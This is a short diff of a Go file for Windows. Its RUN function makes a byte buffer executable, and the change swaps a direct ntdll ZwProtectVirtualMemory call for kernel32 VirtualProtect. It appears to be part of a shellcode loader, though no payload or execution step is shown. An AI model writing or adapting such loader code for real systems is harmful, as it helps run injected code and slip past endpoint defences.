@@ -1,5 +1,4 @@
 // +build windows
-// +build 386
 package main
 
 import (
@@ -14,15 +13,10 @@ const (
 )
 
 func RUN(buf []byte) {
-	var hProcess uintptr = 0
-	var pBaseAddr = uintptr(unsafe.Pointer(&buf[0]))
-	var dwBufferLen = uint(len(buf))
 	var dwOldPerm uint32
-
-	syscall.NewLazyDLL("ntdll").NewProc("ZwProtectVirtualMemory").Call(
-		hProcess-1,
-		uintptr(unsafe.Pointer(&pBaseAddr)),
-		uintptr(unsafe.Pointer(&dwBufferLen)),
+	syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect").Call(
+		uintptr(unsafe.Pointer(&buf[0])),
+		uintptr(len(buf)),
 		PAGE_EXECUTE,
 		uintptr(unsafe.Pointer(&dwOldPerm)),
 	)
